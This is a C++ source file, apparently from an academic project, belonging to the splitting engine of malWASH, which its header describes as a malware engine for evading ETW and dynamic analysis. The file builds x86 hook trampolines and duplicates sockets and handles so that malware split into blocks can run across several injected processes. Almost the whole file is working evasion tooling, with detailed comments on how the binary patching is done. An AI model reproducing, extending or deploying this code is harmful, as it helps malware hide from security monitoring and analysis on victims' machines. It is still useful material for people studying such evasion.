//-----------------------------------------------------------------------------------------------------------
/*
**  malWASH - The malware engine for evading ETW and dynamic analysis: A new dimension in APTs 
**
**  ** The splitting engine ** - Version 2.0
**
**
**	dup.cpp
**
**	This file contains code for dealing with duplicated SOCKETs and HANDLEs. Most of the job is done on
**	executer, but we have to setup the basic structure here.
**
**
**	Kyriakos Ispoglou (ispo) - ispo@purdue.edu
**  June - July 2015 
*/
//-----------------------------------------------------------------------------------------------------------
#include "malwash.h"										// all includes are here


//-----------------------------------------------------------------------------------------------------------
/*
**	crthook(): Create a hook function (detour) to the call/jmp to the imported modules. The role of the hook
**		function is double:
**		[1]. If SOCKET/HANDLE is used as return value, we have to insert it in duptab of the executer and we
**			 inform the other injected processes to call WSADuplicateSocket/DuplicateHandle.
**		[2]. If SOCKET/HANDLE is used as the i-th argument, we have to replace it with the duplicated one 
**			 before call to the actual function.
**
**	NOTE: We can avoid hooks and insert extra code in the middle of block instead. This solution will work
**		when we have a basic block split (as there are no relative jumps within blocks). However if we use 
**		a different splitting mode and each block consist of many basic blocks, this approach won't work.
**
**	Arguments:  blk       (uchar*)     : Block opcodes
**              blkcnt    (uint)       : Block size
**              duptab    (dup_t*)     : A pointer to duptab
**              dupcnt    (uint)       : # of duptab entries
**              funcrel   (funcrel_t*) : A pointer to funcrel
**              funrelcnt (uint)       : # of funcrel entries
**
**	Return Value: Function returns constant ANY. If an error occured, it returns -1
*/
uint crthook( uchar blk[], uint *blkcnt, dup_t duptab[], uint dupcnt, funcrel_t funcrel[], uint funrelcnt )
{
// redefine these MACROS
#define PBYTE1(b)          (blk[(*blkcnt)++] = (b) & 0xff)	// append a single byte to blk array
#define PLONG(l)           *(uint*)(blk + *blkcnt) = (l); *blkcnt += 4	// append a 4 byte integer to blk array
#define PBYTE2(a, b)	   PBYTE1(a); PBYTE1(b)				// append 2 bytes to blk array
#define PBYTE3(a, b, c)	   PBYTE2(a, b); PBYTE1(c)			// append 3 bytes to blk array
#define PBYTE4(a, b, c, d) PBYTE3(a, b, c); PBYTE1(d)		// append 4 bytes to blk array
#define SET_EBX(target)    PBYTE1(0xBB); PLONG(target)		// write the instruction mov ebx, _long_

// this MACRO changes a function relocation offset from and old (o) to a new (n) value:	
#define movreloff(o, n)              \
    for(uint i=0; i<funrelcnt; i++ ) \
        if( funcrel[i].boff == (o) ) \
		{                            \
            funcrel[i].boff = (n);   \
            break;                   \
		} 

	ushort	jmpoff = *blkcnt;								// store current block size
	bool	indhook = false,								// flag for indicating indirect hooks
			callreg = false,								// flag for indicating indirect calls with register
			hdlptr  = false;								// flag for HANDLE pointers


	if( dupcnt == 0 ) return SUCCESS;						// if there's no need for duplications, exit
	
	
	// reserve 5 bytes for adding a relative far jump to skip function definitions.
	// (we can add a relative near jump (1 byte offset) but it's dangerous)
	*blkcnt += 5;

	for(uint d=0; d<dupcnt; d++, indhook=false, callreg=false, 
								 hdlptr=false )				// for each entry in duptab
	{	
		if( blk[duptab[d].boff] == 0x8b ||					// mov reg, __imp__closesocket	
			blk[duptab[d].boff] == 0xa1 )					// mov eax, __imp__closesocket	
		{
			//
			// In this case we have a call to a dup* function through an indirect way: At first we assign
			// dup*'s function address to a register and then we "call" that register. However we don't
			// know at this point whether the "call reg" instruction follows (because it may be on a 
			// different block. So, we'll assume that a "call reg" instruction follows. Furthermore we 
			// require that between "mov" and "call", the register remain intact; Otherwise we don't know
			// the calling function:
			//		.text:0040136B 8B 35 54 20 40 00    mov     esi, ds:CloseHandle		; block #1
			//		.text:00401371 ...
			//		.text:00401374 FF D6                call    esi						; block #7
			//		.text:00401376 ...
			//
			// In direct function calls/jumps we directly modify the call/jump instruction to point at the
			// end of the block. Now we have some troubles:
			//	[1]. The "call reg" instruction is 2 bytes long. We cannot make a call at the end of the 
			//		 block, cause it's 5 bytes. However we can use a 1-byte relative jump, hoping that
			//		 the end of the block size is in <128 bytes.
			//	[2]. The obvious problem of [1], can be solved by modifying function address of at the "mov"
			//		 instruction. Unfortunately this "call reg" uses an absolute address. We don't know the
			//		 exact address of our hook at the end of the block, so we cannot call it.
			//  [3]. Even we're able to determine the exact address at the end of the block, we still have
			//		 problems. Let's say that esi gets address of socket() at block 1. We replace it with 
			//		 the absolute address of our hook. At block 2 there's the "call esi". At that point the
			//		 address of esi will be invalid as long as blocks 1 & 2 get executed under different 
			//		 address spaces.
			//
			//	NOTE: Keep in mind that the mov instruction uses INDIRECT values. Thus the value that we
			//		set to esi will be a pointer to the real value and not the real value itself.
			//
			//	NOTE 2: This is a very rare case!
			//
			//
			//	* * * The proposed solution is the following:
			//	[1]. Define function const_detour() at a predefined address. Map this region to all procceses
			//		 at the same address.
			//	[2]. Replace dup* function address with the absolute address of const_detour(). Thus we can
			//		 transfer control there.
			//	[3]. Now we must somehow jump to the end of the block. We know that we called const_detour() 
			//		 from the basic block. Thus, the return address will be somewhere within the block.
			//	[4]. Just before our normal hook we add a unique 4-byte signature.
			//	[5]. From const_detour() we search down for that signature. Once we find it we transfer control
			//		 there.
			//	[6]. At the end of the block we have the "classic" code for handling duplicated SOCKETs/HANDLEs.
			//
			msg("    [-] Reaching indirect mov with an imported function address.\n" );


			indhook = true;									// enable indirect hooks
		}
		else if( blk[duptab[d].boff]     == 0xff &&			// call reg ?
				 blk[duptab[d].boff + 1] >= 0xd0 &&			// where reg, is a register
				 blk[duptab[d].boff + 1] <= 0xd7 )
		{
			msg("    [-] Reaching indirect call with register.\n" );


			callreg = true;									// enable register calls
		}
		else if( blk[duptab[d].boff + 1] != 0x15 &&			// we consider only indirect calls
				 blk[duptab[d].boff + 1] != 0x25 )			// or indirect jumps :)
		{
			// we have an indirect jump to imported library.
			// we can handle it by doing exactly the same thing with indirect jumps in patchblk().
			// however because we'll end up with large code snippets, we won't handle in this version
			fatal( "Current version cannot duplicate trampoline HANDLE/SOCKET functions" );

			return ERROR;									// abort
		}


		if( (duptab[d].loc & 0xff) == 0 ||					// duplicate return value
			(duptab[d].loc & 0x80) != 0 ||					// or return value & argument
			(duptab[d].loc >> 24)  == DUPPTRHANDLE )		// or duplicate a handle pointer?
		{
			//
			// In such cases, we have a call to a function that returns a SOCKET/HANDLE:
			//		.text:0041185C 52                   push    edx
			//		.text:0041185D FF 15 8C A4 41 00    call    ds:__imp__socket@12
			//		.text:00411863 89 85 6C FE FF FF    mov     [ebp+sock], eax
			// 
			// We replace the function call with a nop (1 byte) + a relative jump to hook (5 bytes):
			//		e9 ?? ?? 00 00          jmp   +???? <hook> 
			// (we don't use a call because this will modify the stack and the 1st argument won't be
			//	in esp+4 anymore).
			//
			// We store the hook at the end of the normal basic block. The first job of the hook is
			// to execute the replaced instruction call/jmp.
			// After call, eax will contain the SOCKET/HANDLE value. Then we call a function that is
			// responsible for inserting the handle in the duplicate's table, duplicating it and informing
			// other processes to use the duplicated handle.
			// However we don't know the address of this function and we have to resolve it at runtime.
			// Thus we insert a call but we leave the address empty. Note that this call should return the 
			// original SOCKET/HANDLE value. After this call we jump to the instruction right after the call 
			// to the hook. In the above example, the code will be changed to:
			//
			//		seg000:0000002F 52                    push    edx
			//		seg000:00000030 90                    nop
			//		seg000:00000031 E9 3F 00 00 00        jmp     loc_75
			//		seg000:00000036                   loc_36:
			//		seg000:00000036 89 85 6C FE FF FF     mov     [ebp-194h], eax
			//		...
	   		//		seg000:00000075                   loc_75:
			//		seg000:00000075 FF 15 8C A4 41 00     call    dword ptr ds:41A48Ch	; ds:__imp__socket@12
			//		seg000:0000007B E8 90 90 90 90        call    near ptr 90909110h
			//		seg000:00000080 E9 B1 FF FF FF        jmp     loc_36
			//
			// NOTE: Handling this: jmp  ds:__imp__socket@12. It's tricky. First of all, this jump will 
			//		 be the last instruction of a block and thus, will be replaced by a bunch of instructions
			//	 	 from patchblk(). patchblk() will replace the return address with a fake one. We must
			//		 add some offset to that return address, because we want to return to the instruction 
			//		 below and not to the "return_here" label which is the default return address in indirect 
			//		 jumps.
			//
			ushort	imploc = *blkcnt + 2,					// new offset of call to the imported module
					duprepl;								// offset of the unknonw dup* function
			uint	indjmpoff;								// in case of indirect jumps (not calls) some 
															// offsets must change


			// In case that we have both an argument and a return address, we combine the 2 methods:
			//		.text:00401101                 push    edi
			//		.text:00401102                 call    ds:accept
			//		.text:00401108                 mov     esi, eax
			//
			// The above code becomes:
			//		seg000:0000002D 57                    push    edi
			//		seg000:0000002E 90                    nop
			//		seg000:0000002F E9 44 00 00 00        jmp     loc_78
			//		seg000:00000034                   loc_34:
			//		seg000:00000034 8B F0                 mov     esi, eax
			//		...
			//		seg000:00000078                   loc_78:
			//		seg000:00000078 8B 44 24 00           mov     eax, [esp+0]
			//		seg000:0000007C E8 90 90 90 90        call    near ptr 90909111h
			//		seg000:00000081 89 44 24 00           mov     [esp+0], eax
			//		seg000:00000085 FF 15 34 61 40 00     call    dword ptr ds:406134h
			//		seg000:0000008B E8 90 90 90 90        call    near ptr 90909120h
			//		seg000:00000090 E9 9F FF FF FF        jmp     loc_34
			//
			//
			// However there's another case: PHANDLE. Here, a HANDLE is returned from the function but
			// not as a return value, but through an indirect pointer that passed as argument. We work
			// similar here, except that instead of storing the eax (return value) in *duptab, we store
			// the right argument first:
			//
			if( (duptab[d].loc & 0x80) )					// duplicate an argument?
			{
				msg( "        [+] Creating a hook function for return value and argument %d at offset %d\n", 
						duptab[d].loc & 0x7f, duptab[d].boff & 0xff );

				duprepl = *blkcnt;							// get offset of dup* function call

				// insert a: "mov eax, DWORD PTR [esp+0x?]" (8b 44 24 0?) to read thea argument that needs to
				// be duplicated. ? is the argument location*4
				// WARNING: Because we use a jmp instead of a call, there's no return value at the top of the stack.
				//			Thus the 1st argument will be at [esp], and not at [esp+4]
				PBYTE4( 0x8B, 0x44, 0x24, ((duptab[d].loc & 0x7f) - 1) << 2 );
				PBYTE1( 0xe8 );								// call
				PLONG( 0x90909090 );						// we can use this space to store info
		
				// after call, replace the argument with the duplicated one: 
				// "mov DWORD PTR [esp+0x?], eax" (89 44 24 0?)
				PBYTE4( 0x89, 0x44, 0x24, ((duptab[d].loc & 0x7f) - 1) << 2 );

				imploc = *blkcnt + 2;						// update imported function offset
			}
			else if( (duptab[d].loc >> 24) == DUPPTRHANDLE )
			{
				hdlptr = true;								// enable flag
			}
			else msg( "        [+] Creating a hook function for return value at offset %d\n", duptab[d].boff);


			/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
			** TODO: Implement "callreg" when HANDLE/SOCKET is a return value             **
			* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */


			if( blk[duptab[d].boff + 1] == 0x25 )			// indirect jump instead of call?
			{
				// we must adjust the fake return address. We want to return at the instruction below
				// and not at "return_here" (see indirect jumps in reloc.cpp->patchblk()).
				// all we have to do is to add some offset to the current return address:				 
				//		83 04 24 ??         add    DWORD PTR [esp], 0x??
				//
				// Calculating the right offset:
				//	Because PBYTE4 is 4 PBYTE1, at the last point, blkcnt will already increased by 3.
				//	The real value is *blkcnt - 3, which points at the beginning of the last instruction.
				//	duptab[d].boff - 2 is the beginning of the instruction before detour, +6 to go to the
				//  next instruction. Their difference gives the offset from the original return address 
				//	to the desired one.
				PBYTE4( 0x83, 0x04, 0x24, (*blkcnt - 3 - duptab[d].boff - 2 + 6) & 0xff );

				imploc = *blkcnt + 2;						// update imported function offset
				indjmpoff = -4;								// slightly change jump to include the above instr.

			} else indjmpoff = 0;							// otherwise don't change offsets


			if( indhook ) {									// in indirect hooks start with signature
				PBYTE2( 0xeb, 0x04 );						// jump 4 bytes ahead
				PLONG(DUPUNIQUESIG);						// add magic signature
			}
			
			if( blk[duptab[d].boff] == 0xa1 ) PBYTE1(0x90); // add some space because this instr. is 5 bytes

			memcpy(&blk[*blkcnt], &blk[duptab[d].boff], 6);	// move call/jmp instr. to the end of the block

			if( indhook ) {									// in indirect hooks we do different modifications
				
				*blkcnt -= blk[duptab[d].boff]==0xa1 ? 1:0; // adjust counter in case of 5 byte instruction

				blk[*blkcnt + 0] = 0xff;					// we have copy the "mov" and the end of the block
				blk[*blkcnt + 1] = 0x15;					// change it to "call"
			}
			else *(uint*)(blk + duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 1 : 2 )) = 
						!indhook ? 
							(((duptab[d].loc & 0x80) ? duprepl : *blkcnt) - duptab[d].boff - 6 + indjmpoff) :
							DUPDETOURADDR;					// mov reg, __imp__closesocket => mov reg, [DUPDETOURADDR]

			*blkcnt += 6;									// increase counter
		

			duprepl = *blkcnt + 1;							// get offset of dup* function call

			if( hdlptr )
			{
				/*
					50                      push   eax
					8b 44 24 10             mov    eax,DWORD PTR [esp+0x10]
					8b 00                   mov    eax,DWORD PTR [eax]
					58                      pop    eax 
				*/
				PBYTE1( 0x50 );								// push eax
				PBYTE4( 0x8b, 0x44, 0x24, 
					0x100 - ((((duptab[d].loc >> 8) & 0xff) + 1 + 2) << 2) );

				PBYTE2( 0x8b, 0x00 );						// mov eax, [eax]
				duprepl += 7;

				duptab[d].loc = (duptab[d].loc & 0x00ffffff) | (DUPPTRHANDLE << 24);
			}

			PBYTE1( 0xe8 );									// call
			PLONG( 0x90909090 );							// we can use this space to store info
															//

			if( hdlptr ) PBYTE1( 0x58 );					// pop eax

			if( !indhook ) {								// relocate only in direct hooks

				PBYTE1( 0xe9 );								// jump back to the instruction after hook
				PLONG(-(int)(*blkcnt - duptab[d].boff - 2));// calculate offset

				// don't forget these!
				blk[ duptab[d].boff ] = 0x90;				// nop
				blk[duptab[d].boff+1] = 0xe9;				// jump + find the offset
			}
			else PBYTE1( 0xc3 );							// we already have the return address

			// because we moved a call to an imported module, we have to update the offset in funcrel
			// table. Otherwise we'll try to relocate a function at the wrong offset
			movreloff(duptab[d].boff+2, imploc);

			duptab[d].boff = duprepl;						// boff now points to unknown dup* function	
		}
		else  {  											// duplicate an argument?
			//
			// Now, we have a call/jmp to a function that takes a SOCKET/HANDLE as argument:
			//		.text:00411883 51                   push    ecx
			//		.text:00411884 FF 15 88 A4 41 00    call    ds:__imp__connect@12
			//		.text:0041188A 83 F8 FF             cmp     eax, 0FFFFFFFFh
			//
			// We replace the function call with a nop (1 byte) + a relative call to hook (5 bytes):
			//		e8 ?? ?? 00 00          call   +???? <hook> 
			//
			// This time, the first job of the hook, is to read the argument that needs to be duplicated 
			// and call a function from dup* family to find the right duplicated SOCKET/HANDLE for this 
			// process. Then we have to replace the original argument with the duplicated one.
			// Finally we jump to the imported module (instead of call). Once we execute a "retn" inside
			// the imported module, we'll return to the instruction after the call. Let's see how the above
			// example becomes:
			//
			//		seg000:00000056 51                    push    ecx
			//		seg000:00000057 90                    nop
			//		seg000:00000058 E8 28 00 00 00        call    sub_85
			//		seg000:0000005D 83 F8 FF              cmp     eax, 0FFFFFFFFh
			//		...
		    //		seg000:00000085                   sub_85 proc near
			//		seg000:00000085 8B 44 24 04           mov     eax, [esp + 0x04]	
			//		seg000:00000089 E8 90 90 90 90        call    near ptr 9090911Eh
			//		seg000:0000008E 89 44 24 04           mov     [esp + 0x04], eax 
			//		seg000:00000092 FF 25 88 A4 41 00     jmp     dword ptr ds:41A488h ; ds:__imp__connect@12
			//
			//	If we want to replace 2 arguments we can easily generalize this method:
			//		seg000:0000008D 90                    nop
			//		seg000:0000008E E8 12 00 00 00        call    sub_A5
			//		seg000:00000093 3B F4                 cmp     esi, esp
			//		...
			//		seg000:000000A5 8B 44 24 04           mov     eax, [esp+arg_0]
			//		seg000:000000A9 87 5C 24 08           xchg    ebx, [esp+arg_4]
			//		seg000:000000AD E8 90 90 90 90        call    near ptr 90909142h
			//		seg000:000000B2 89 44 24 04           mov     [esp+arg_0], eax
			//		seg000:000000B6 87 5C 24 08           xchg    ebx, [esp+arg_4]
			//		seg000:000000BA FF 25 68 C2 42 00     jmp     dword ptr ds:42C268h
			//
			//	In this case we use both eax and ebx to store the arguments. However we have to call a different
			//	function (not locduphdl(), which replaces eax only). The new function will call locduphdl() twice
			//	and will return the right value to eax and ebx respectively. We can easily generalize this method
			//	to duplicate >2 arguments. However it's very rare to meet such cases, so we'll only use the simple 
			//	method here.
			//
			// NOTE: If we have indirect jump instead (jmp ds:__imp__connect@12), all we have to do, is to replace
			//		 the first call (call sub_85) with a jump (jmp sub_85)
			//
			// NOTE 2: We can eax without taking a backup. During a function call, eax will have the return value,
			//		so eax is not important before function call (library functions use __cdelc or __stdcall, thus
			//		it's impossible to pass arguments through eax).
			//
			ushort	duprepl;								// offset of the unknonw dup* function


			msg( "        [+] Creating a hook function for argument %d at offset %d\n", 
					duptab[d].loc & 0xff, duptab[d].boff);

			if( indhook || callreg ) {						// in indirect hooks start with signature
				PBYTE2( 0xeb, 0x04 );						// jump 4 bytes ahead
				PLONG(DUPUNIQUESIG);						// add magic signature
			}

			// insert a: "mov eax, DWORD PTR [esp+0x?]" (8b 44 24 0?) to read thea argument that needs to
			// be duplicated. ? is the argument location*4
			PBYTE4( 0x8B, 0x44, 0x24, (duptab[d].loc & 0xff) << 2 );

			if( duptab[d].loc >> 24 == DUPHANDLE2 || duptab[d].loc >> 24 == DUPSOCK2 ) {
				// we have 2 arguments. Use ebx register also:
				// xchg DWORD PTR [esp+0x??], ebx 
				PBYTE4( 0x87, 0x5c, 0x24, ((duptab[d].loc & 0xff00) >> 8) << 2 );
			}

			duprepl = *blkcnt + 1;							// get offset of dup* function call
			
			PBYTE1( 0xe8 );									// call
			PLONG( 0x90909090 );							// we can use this space to store info
		
			// after call, replace the argument with the duplicated one: 
			// "mov DWORD PTR [esp+0x?], eax" (89 44 24 0?)
			PBYTE4( 0x89, 0x44, 0x24, (duptab[d].loc & 0xff) << 2 );

			if( duptab[d].loc >> 24 == DUPHANDLE2 || duptab[d].loc >> 24 == DUPSOCK2 ) {
				// restore ebx and patch the duplicataed argument in 1 step :)
				PBYTE4( 0x87, 0x5c, 0x24, ((duptab[d].loc & 0xff00) >> 8) << 2 );
			}


			if( blk[duptab[d].boff] == 0xa1 ) PBYTE1(0x90); // add some space because this is 5 bytes
						
			
			memcpy(&blk[*blkcnt], &blk[duptab[d].boff], 6);	// move call/jmp in the hook
															// if callreg = 1, move garbage
				
			// Convert call to jump (indirect jump and indirect call differ only in 2nd byte:
			//		FF 25 B8 A3 41 00    jmp     ds:__imp__memset                     ; 5
			//		FF 15 88 A4 41 00    call    ds:__imp__connect@12
			//		8B 35 88 A4 41 00    mov	 esi, ds:__imp__connect@12
			blk[ (*blkcnt) + 0 ] = 0xff;				// useful only when we have a "mov"
			blk[ (*blkcnt) + 1 ] = 0x25;				// convert call to jmp

			if( !callreg )													
			{											// if we don't have indirect calls			
				if( !indhook ) {							// relocate only in direct hooks

					blk[ duptab[d].boff ] = 0x90;			// nop
					blk[duptab[d].boff+1] = blk[duptab[d].boff + 1] == 0x15 ? 							
											0xe8 :			// if we have an indirect call, then use call (0xe8)
											0xe9;			// otherwise use an indirect jump (0xe9) 
				}
			
				// In case of an indirect hook (mov) we simply use the const_detour() address. We check
				// whether we use eax (5 bytes) or other register (6 bytes). In call/jmp:
				// 
				// find the call offset: 
				//	4 bytes for: mov eax, DWORD PTR [esp+0x?]
				//  5 bytes for call to dup* function
				//  4 bytes for: mov DWORD PTR [esp+0x?], eax
				//  6 bytes for indirect jump to imported moodule
				// +4 +4 for 2 xchg instructions in case of double argument replacement
				*(uint*)(blk + duptab[d].boff + (blk[duptab[d].boff] == 0xa1 ? 1 : 2)) = 
					!indhook ? (*blkcnt - duptab[d].boff - 4 - 5 - 4 - 6
									- ((duptab[d].loc >> 24 == DUPHANDLE2 || duptab[d].loc >> 24 == DUPSOCK2) ? 4 + 4 : 0))
							: DUPDETOURADDR;				// mov reg, __imp__closesocket => mov reg, [DUPDETOURADDR]
			}

			// update function relocation
			movreloff(duptab[d].boff+(blk[duptab[d].boff] == 0xa1 ? 1 : 2), *blkcnt + 2);
			duptab[d].boff = duprepl;						// boff now points to unknown dup* function	
		
			*blkcnt += 6;									// adjust block size
		}
	}

	// we insert hooks at the end of basic block. We have to finish basic block with a jump to skip hooks:
	blk[ jmpoff ] = 0xe9;									// jump
	*(uint*)(blk + jmpoff + 1) = (*blkcnt - jmpoff - 5);	// find offset (5 = jump size)

	return SUCCESS;											// return

#undef SET_EBX												// undefine MACROS
#undef PBYTE4
#undef PBYTE3
#undef PBYTE2
#undef PLONG
#undef PBYTE1
}
//-----------------------------------------------------------------------------------------------------------
/*
**	dupchk(): This function checks whether an imported function from a module uses a SOCKET or a HANDLE. 
**		Because subsequent blocks of the splitted program will be in different processes, we'll have 
**		troubles. If process 1 open a socket, then process 2 cannot write to it. Fortunately, functions
**		WSADuplicateSocket() and DuplicateHandle() can solve this problem.
**		IDA helps us for one more type. When we have a call/jmp to an imported module, the first data xref
**		from this address, will always point to an entry inside IAT. By reading the type of this entry we
**		identify the imported function declaration with high detail. For instance:
**			SOCKET __stdcall socket(int af, int type, int protocol)
**		From the above string it's very easy to see if and which arguments (or the return value) use a 
**		socket. Thus we can avoid having a huge list of all function that use socket/handles and check each 
**		imported function against this list to see if the latter uses any socket/handles.
**
**	Arguments:  iaddr (ea_t) : Address of the instruction that transfers control to the imported module
**
**	Return Value: If any errors occured, the return value is -1. Otherwise function returns a 32bit number
**		The 8 LSBits of this number denote the location of the argument whereas the 8 MSBits the duplication
**		type (0 for HANDLE, or 1 for SOCKET). If function has 2 arguments that needs to be duplicated, the
**		2 LSBytes will have the argument locations. (In case of 1 argument + return value, both will be on
**		LSByte).
*/
uint dupchk( ea_t iaddr )
{
	type_t	buf    [MAXIMPFUNDECLLEN];						// the first 3 buffers are auxilary
	p_list	fnames [MAXIMPFUNDECLLEN];						//
	char	func   [MAXFUNAMELEN];							// function name	
	char	type   [MAXIMPFUNDECLLEN],						//
			fundecl[MAXIMPFUNDECLLEN];						// this buffer contains the function declaration
	ea_t	iat_addr;										// address of function in IAT
	ushort	duploc, done;									// local vars
	uint	retval = ANY;									// return value


	// don't duplicate CreateThread
	get_name(BADADDR, get_first_dref_from(iaddr) != BADADDR ? 
					  get_first_dref_from(iaddr) :			// for "call __imp__closesocket"
					  get_next_cref_from(iaddr, get_first_cref_from(iaddr)), // for "call esi; __imp__closesocket"
			 func, MAXFUNAMELEN);		
	 	
	if( strstr(func, "CreateThread" ) )						// check if it is CreateThread()
		return ANY;

	iat_addr = get_first_dref_from(iaddr) != BADADDR ?		// get address of function entry in IAT
			   get_first_dref_from(iaddr) : get_next_cref_from(iaddr, get_first_cref_from(iaddr));

	// get type information (to arrays buf and fnames)
	// WARNING: get_ti is DERPECATED
	get_ti(iat_addr, buf, MAXIMPFUNDECLLEN,  fnames, MAXIMPFUNDECLLEN );

	// print type into 1 signle line (merge buf and fnames to produce type)
	print_type_to_one_line(type, MAXIMPFUNDECLLEN, idati, buf, NULL, NULL, fnames, NULL);

	// convert type to a normal char* string
	strcpy_s(fundecl, MAXIMPFUNDECLLEN, qstrdup(type));



//	if( !strcmp(func, "NtClose" ) )						// check if it is CreateThread()
//		strcpy_s(fundecl, MAXIMPFUNDECLLEN, "BOOL __stdcall (HANDLE hObject)");


	// at this point funcdecl contains the full function declaration (without function name). For example
	// function declaration: 
	//		int __stdcall LoadStringW(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax)
	// will give us the string:
	//		int __stdcall(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int cchBufferMax)
	msg( "    [*] Getting imported function declaration: %s\n", fundecl );	
	

	duploc = 0;												// clear iterator
	done   = 0;												// not trampolines created so far

	// now, parse the arguments and search for SOCKET or HANDLE arguments
	// we'll use secure version of strtok, to get all tokens from function declaration. Delimiters are: '('
	// ')' and ','. The first token will be the return type followed by calling convention. Then next tokens
	// will be the function arguments (type [space] name).
	for( char *nxttok, *token=strtok_s(fundecl, "(),", &nxttok); token!=NULL; 
						token=strtok_s(NULL,    "(),", &nxttok), ++duploc
	   )
    {
		char	func[MAXFUNAMELEN] = {0};					// store function name here

		// because there's a space after delimiter ',', all arguments after 1st will start with a space.
		// Remove it.
		if( token[0] == ' ' ) token++;

		//
		// It's very rare to find a function that uses more than one socket/handle as arguments.
		// A distinct example is accept() which takes a SOCKET as an argument and returns a SOCKET.
		// In the same category belogs CreateFile() which takes a HANDLE as argument and returns a 
		// HANDLE. So, let's enumerate the possible cases here:
		//	[1]. SOCKET a(int, ...)					--> VALID
		//	[2]. int	b(SOCKET, ...)				--> VALID
		//	[3]. SOCKET c(SOCKET, ...)				--> VALID
		//	[4]. int	d(SOCKET, SOCKET, ...)		--> VALID
		//	[5]. SOCKET e(SOCKET, SOCKET, ...)		--> INVALID
		//	[6]. int    f(HKEY, ..., PHKEY)			--> VALID
		//
		// We only consider cases [1, 2, 3, 4] here, although it's not way harder to have trampoline 
		// functions that handle many duplicated arguments. Case [5] is very rare (if not impossible)
		// to find it. The same are true for for HANDLEs.
		// You can meet case [6] in Windows Registry functions. In [6] we have to store the last (always 
		// the last) argument in duptab, instead of replacing it.
		//
		if( strstr(token, "SOCKET") != NULL )				// SOCKET as argument?
		{
			if( ++done > 1 ) {
				// parse the arguments from left to right, so in case [3], LSB of retval will be 0.
				if( retval & 0xff ) {

					// we have 2 arguments that need to be replaced: 1st arg in LSByte, 2nd in 2nd LSByte
					retval = (DUPSOCK2 << 24) | (duploc << 8) | (retval & 0xff);		

					if( done > 2 ) {						// no more than 2
						fatal("Current version does not create hooks with >2 SOCKET arguments");
						return ERROR;
					}
				}
				else 
				// if you already have 2 (valid) arguments, then one of these will be >0. Thus you cannot
				// pass the previous check. If have 1 argument we know that is the return value, so we set
				// the MSBit:
				retval = (DUPSOCK << 24) | duploc | 0x80;	// set MSBit of LSByte
				continue;									// skip code below
			}

			// Special Case when function is closesocket()
			get_name(BADADDR, iat_addr, func, MAXFUNAMELEN);// get name of address from .idata

			if( strstr(func, "closesocket") )				// closesocket() is called?
			{
				retval = (CLOSESOCK << 24) | duploc;		// set return value
			}
			else retval = (DUPSOCK << 24) | duploc;			// set return value
		}

		else if( strstr(token, "PHANDLE") != NULL ||	 	// HANDLE or
			     strstr(token, "PHKEY")   != NULL )			// HKEY pointer as argument?
		{
			// we treat PHANDLE and PHKEY as return values
			if( ++done > 1 ) {

				// we know that the 2nd LSByte has the HANDLE/HKEY pointer
				retval = (DUPPTRHANDLE << 24) | (duploc << 8) | (retval & 0xff);		
				continue;										// skip code below
			}
			
			fatal("HANDLE/HKEY pointers can only be the last dup* arguments");
		}

		else if( strstr(token, "HANDLE") != NULL ||	 		// HANDLE or
				 strstr(token, "HKEY")   != NULL )			// HKEY as argument?
		{
			if( ++done > 1 ) {
				// parse the arguments from left to right, so in case [3], LSB of retval will be 0.
				if( retval & 0xff ) {
					
					// we have 2 arguments that need to be replaced: 1st arg in LSByte, 2nd in 2nd LSByte
					retval = (DUPPTRHANDLE << 24) | (duploc << 8) | (retval & 0xff) | 0x80;		

					if( done > 2 ) {						// no more than 2
						fatal("Current version does not create hooks with >2 HANDLE arguments");
						return ERROR;
					}
				}
				else 
				// if you already have 2 (valid) arguments, then one of these will be >0. Thus you cannot
				// pass the previous check. If have 1 argument we know that is the return value, so we set
				// the MSBit:
				retval = (DUPHANDLE << 24) | duploc | 0x80;	// set MSBit of LSByte
				continue;									// skip code below
			}

			// Special Case when function is CloseHandle()
			get_name(BADADDR, iat_addr, func, MAXFUNAMELEN);// get name of address from .idata
			
			if( strstr(func, "CloseHandle") || 				// CloseHandle() or
				strstr(func, "RegCloseKey") )				// RegCloseKey() is called?
			{
				retval = (CLOSEHANDLE << 24) | duploc;		// set return value
			}
			else retval = (DUPHANDLE << 24) | duploc;		// set return value
		}
    }
	
	if( retval != ANY ) {
		msg( "    [-] Registering a hook function at %x. Duplicating %s at argument #%d\n", 
			iaddr, ((retval >> 8) == DUPSOCK ? "SOCKET" : "HANDLE"), retval & 0x7F );
	}

	return retval;											// return type + location 
}
//-----------------------------------------------------------------------------------------------------------
